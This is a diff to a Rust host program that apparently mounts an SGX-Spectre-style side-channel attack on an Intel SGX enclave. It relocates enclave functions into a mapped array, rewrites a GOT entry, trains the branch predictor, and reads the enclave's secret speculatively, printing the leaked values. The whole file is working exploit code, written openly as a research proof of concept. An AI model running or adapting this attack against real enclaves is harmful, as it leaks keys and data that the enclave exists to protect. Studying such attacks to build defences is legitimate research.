@@ -41,6 +41,7 @@ use libc::c_void;
 static ENCLAVE_FILE: &'static str = "enclave1.signed.so";
 
 extern "C" {
+    fn Enclave1_get_secret_addr(eif: sgx_enclave_id_t, retval: *mut uint64_t) -> sgx_status_t;
     fn Enclave1_spectre_enclave(eif: sgx_enclave_id_t, retval: *mut uint64_t) -> sgx_status_t;
     fn Enclave1_spectre_test(
         eif: sgx_enclave_id_t,
@@ -74,7 +75,7 @@ fn main() -> std::io::Result<()> {
     #[cfg(not(feature = "multithread"))]
     {
         let mut cpuset = CpuSet::new();
-        cpuset.set(0).unwrap();
+        cpuset.set(1).unwrap();
         sched_setaffinity(Pid::from_raw(0), &cpuset).unwrap();
     }
 
@@ -102,7 +103,7 @@ fn main() -> std::io::Result<()> {
 
     let mut secret_full_addr = 0;
 
-    let result = unsafe { Enclave1_spectre_enclave(ENCLAVE.geteid(), &mut secret_full_addr) };
+    let result = unsafe { Enclave1_get_secret_addr(ENCLAVE.geteid(), &mut secret_full_addr) };
     if result != sgx_status_t::SGX_SUCCESS {
         return Err(std::io::Error::new(
             std::io::ErrorKind::Other,
@@ -134,31 +135,16 @@ fn main() -> std::io::Result<()> {
         }
     };
 
-    /*
-    let nop = {
-        let nop_arr = [0x90];
-
-        cs.disasm_count(&nop_arr, 0, 1)
-            .unwrap()
-            .iter()
-            .next()
-            .unwrap()
-    };
-    */
-
     let mut minidow_secret_sym = goblin::elf::Sym::default();
     let mut secret_sym = goblin::elf::Sym::default();
     let mut spectre_limit_sym = goblin::elf::Sym::default();
-
-    //let mut jb_offset = 0;
-    //let mut jb_dst_addr = 0;
-    //let mut ret_offset = 0;
 
     let mut access_memory_spectre_offset = 0;
     let mut access_memory_spectre_size = 0;
 
     let mut spectre_test_offset = 0;
     let mut spectre_test_size = 0;
+    let mut spectre_test_got_addr = 0;
 
     for sym in elf.syms.iter() {
         let symbol_name = elf.strtab.get(sym.st_name).unwrap().unwrap();
@@ -171,40 +157,35 @@ fn main() -> std::io::Result<()> {
         } else if symbol_name == "access_memory_spectre" {
             access_memory_spectre_offset = sym.st_value as usize;
             access_memory_spectre_size = sym.st_size as usize;
+        } else if symbol_name == "spectre_test" {
+            spectre_test_offset = sym.st_value as usize;
+            spectre_test_size = sym.st_size as usize;
 
-            /*
             let asm_code =
-                &enclave_binary[access_memory_spectre_offset..access_memory_spectre_offset + access_memory_spectre_size];
+                &enclave_binary[spectre_test_offset..spectre_test_offset + spectre_test_size];
 
             println!("function code: {:?}", asm_code);
             let insns = cs
                 .disasm_all(asm_code, sym.st_value)
                 .expect("Failed to disassemble");
 
-            for insn in insns.iter() {
-                // we assume that there is only one (inconditional) return instruction in the function
-                if let Some("jb") = insn.mnemonic() {
-                    jb_offset = insn.address();
-                    let details = cs.insn_detail(&insn).unwrap();
-                    let operands = details.arch_detail().operands();
-                    if let capstone::arch::ArchOperand::X86Operand(
-                        capstone::arch::x86::X86Operand {
-                            op_type: capstone::arch::x86::X86OperandType::Imm(v),
-                            ..
-                        },
-                    ) = operands[0]
-                    {
-                        jb_dst_addr = v;
-                    }
-                } else if let Some("ret") = insn.mnemonic() {
-                    ret_offset = insn.address();
-                    break;
-                }
+            // we expect an instruction in the likes of "jmp qword ptr [rip + 0x234a2]"
+            let jmp = insns.iter().next().unwrap();
+            if jmp.mnemonic() != Some("jmp") {
+                panic!("Invalid instruction in spectre_test");
             }
-            */
-        } else if symbol_name == "spectre_test" {
-            spectre_test_offset = sym.st_value as usize;
-            spectre_test_size = sym.st_size as usize;
+            let details = cs.insn_detail(&jmp).unwrap();
+            println!("{:?}", details);
+            let operands = details.arch_detail().operands();
+            println!("{:?}", operands);
+            if let capstone::arch::ArchOperand::X86Operand(capstone::arch::x86::X86Operand {
+                op_type: capstone::arch::x86::X86OperandType::Mem(mem_op),
+                ..
+            }) = operands[0]
+            {
+                spectre_test_got_addr =
+                    jmp.address() as usize + jmp.bytes().len() + mem_op.disp() as usize;
+            }
         }
     }
 
@@ -220,7 +201,7 @@ fn main() -> std::io::Result<()> {
     // see the SgxSpectre paper for more details on why we simulate only the last 32 bits of
     // addresses
     // note that this isn't really 4GB is size because of the relation we perform by adding
-    // base_32bit_offset
+    // base_32bit_offset, so we would be better off not using the end of this array ;)
     let mapped_array: &mut [u8; 1 << 32] = unsafe {
         let addr = mmap(
             0 as *mut c_void,
@@ -262,11 +243,11 @@ fn main() -> std::io::Result<()> {
         measurement_array_addr: usize,
         target_addr: usize,
     ) = unsafe {
-        let dst_addr = &mut mapped_array[access_memory_spectre_offset] as *mut u8;
+        let dst_addr = &mapped_array[access_memory_spectre_offset] as *const _ as usize;
 
         std::ptr::copy(
             &enclave_binary[access_memory_spectre_offset] as *const u8,
-            dst_addr,
+            dst_addr as *mut u8,
             access_memory_spectre_size,
         );
 
@@ -276,6 +257,9 @@ fn main() -> std::io::Result<()> {
             &mut mapped_array[spectre_test_offset],
             spectre_test_size,
         );
+        // spectre test calls a function stored in the GOT, so let's add the relocated adress of
+        // access_memory_spectre there
+        *(&mut mapped_array[spectre_test_got_addr] as *mut _ as *mut usize) = dst_addr as usize;
 
         // we need to add the statics too if we want the function to work well
         std::ptr::copy(
@@ -313,8 +297,7 @@ fn main() -> std::io::Result<()> {
             spectre_test_size,
         );
 
-        //std::mem::transmute(&mapped_array[spectre_test_offset])
-        std::mem::transmute(dst_addr)
+        std::mem::transmute(&mapped_array[spectre_test_offset])
     };
 
     setup_measurements();
@@ -328,6 +311,15 @@ fn main() -> std::io::Result<()> {
         }
     }
 
+    let result =
+        unsafe { Enclave1_spectre_enclave(ENCLAVE.geteid(), &mut TARGET as *mut _ as *mut u64) };
+    if result != sgx_status_t::SGX_SUCCESS {
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::Other,
+            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
+        ));
+    }
+
     let minidow_secret_array_addr_in_enclave = minidow_secret_array_rela_addr as i64
         + mapped_array as *const _ as i64
         + top_32bit_offset as i64;
@@ -336,14 +328,7 @@ fn main() -> std::io::Result<()> {
         minidow_secret_array_addr_in_enclave
     );
 
-    unsafe {
-        TARGET = secret_full_addr as usize;
-        //let target = secret_sym.st_value as usize
-        //    + top_32bit_offset as usize
-        //    + mapped_array as *const _ as usize;
-        //let target = minidow_secret_array_addr_in_enclave as usize + 120;
-        println!("target: 0x{:x}", TARGET);
-    }
+    println!("target: 0x{:x}", unsafe { TARGET });
 
     let spectre = Spectre::new(
         Some(spectre_test_training_fun),
@@ -351,14 +336,6 @@ fn main() -> std::io::Result<()> {
         Some((minidow_secret_array_addr_in_enclave as usize + 64) as *const i8),
         Some(spectre_limit_addr as *const u8),
     );
-
-    // use a lot of nops to try to make the predictor take longer to detect the misprediction
-    //static mut BRANCH_DST_ADDR: *mut u8 = 0 as *mut u8;
-    //unsafe {
-    //    std::arch::x86_64::_mm_prefetch(target as *const i8, std::arch::x86_64::_MM_HINT_T0);
-    //    BRANCH_DST_ADDR =
-    //        (jb_dst_addr + mapped_array as *const _ as i64 + top_32bit_offset as i64) as *mut u8;
-    //}
 
     println!(
         "0x{:x}",
@@ -370,9 +347,22 @@ fn main() -> std::io::Result<()> {
                     TARGET as *const i8,
                     std::arch::x86_64::_MM_HINT_T0,
                 );
-                //std::arch::x86_64::_mm_clflush(BRANCH_DST_ADDR);
             },
             unsafe { TARGET }
+        )
+    );
+    println!(
+        "0x{:x}",
+        minidow::read_ptr(
+            &spectre,
+            || unsafe {
+                // try to prefetch, in the hoep it will help
+                std::arch::x86_64::_mm_prefetch(
+                    (TARGET + 8) as *const i8,
+                    std::arch::x86_64::_MM_HINT_T0,
+                );
+            },
+            unsafe { TARGET + 8 }
         )
     );
 
